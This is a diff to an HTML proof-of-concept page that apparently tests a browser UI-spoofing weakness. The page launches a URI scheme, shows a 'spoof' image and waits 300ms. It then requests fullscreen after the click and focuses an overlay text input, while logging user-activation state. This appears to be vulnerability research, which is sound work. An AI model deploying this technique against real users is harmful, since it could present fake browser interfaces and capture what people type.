@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
     />
-    <title>tester-diag-schemes</title>
+    <title>tester-diag-fs-delay</title>
     <style>
       html,
       body {
@@ -43,6 +43,24 @@
         justify-content: center;
         gap: 12px;
       }
+      #overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.35);
+        align-items: center;
+        justify-content: center;
+        z-index: 10;
+      }
+      #overlay.show {
+        display: flex;
+      }
+      #overlayInput {
+        padding: 10px 14px;
+        font-size: 16px;
+        border: 2px solid #222;
+        background: #fff;
+      }
       select,
       button {
         padding: 12px 20px;
@@ -56,7 +74,7 @@
     <img id="spoof" src="spoof.png" alt="spoof" decoding="sync" />
 
     <div id="bait">
-      <h2>Scheme &amp; Fullscreen Diag</h2>
+      <h2>Scheme &amp; Delayed Fullscreen Diag</h2>
       <label for="schemeSelect">Target URI Scheme:</label>
       <select id="schemeSelect">
         <option value="geo:0,0?q=test">geo: (geo:0,0?q=test)</option>
@@ -67,15 +85,29 @@
       <button id="btn">run test</button>
     </div>
 
+    <div id="overlay" aria-hidden="true">
+      <input id="overlayInput" type="text" placeholder="diag focus target" />
+    </div>
+
     <script>
+      const docEl = document.documentElement;
+      const reqFS =
+        docEl.requestFullscreen ||
+        docEl.webkitRequestFullscreen ||
+        docEl.mozRequestFullScreen ||
+        docEl.msRequestFullscreen;
+
       const btn = document.getElementById("btn");
       const schemeSelect = document.getElementById("schemeSelect");
       const bait = document.getElementById("bait");
       const spoof = document.getElementById("spoof");
+      const overlay = document.getElementById("overlay");
+      const overlayInput = document.getElementById("overlayInput");
 
       const logEvent = (label, extra = "") => {
         const ts = performance.now().toFixed(2);
-        console.info(`[PoC +${ts}ms] ${label}`, extra);
+        const active = navigator.userActivation?.isActive ?? "n/a";
+        console.info(`[PoC +${ts}ms | act=${active}] ${label}`, extra);
       };
 
       spoof.addEventListener("load", () => {
@@ -120,14 +152,28 @@
         spoof.style.display = "block";
         logEvent("dom visibility toggled");
 
-        if (document.documentElement.requestFullscreen) {
-          document.documentElement
-            .requestFullscreen()
-            .then(() => logEvent("requestFullscreen resolved"))
-            .catch((err) => logEvent("requestFullscreen rejected", err?.message || String(err)));
-        } else {
-          logEvent("requestFullscreen unsupported");
-        }
+        setTimeout(() => {
+          logEvent("timeout 300ms fired");
+
+          if (typeof reqFS === "function") {
+            const result = reqFS.call(docEl);
+            if (result && typeof result.catch === "function") {
+              result
+                .then(() => logEvent("requestFullscreen resolved"))
+                .catch((err) =>
+                  logEvent("requestFullscreen rejected", err?.message || String(err))
+                );
+            } else {
+              logEvent("requestFullscreen invoked (non-promise)");
+            }
+          } else {
+            logEvent("requestFullscreen unsupported");
+          }
+
+          overlay.classList.add("show");
+          overlayInput.focus();
+          logEvent("overlay shown & input focused", `active=${document.activeElement?.id || "none"}`);
+        }, 300);
       });
     </script>
   </body>
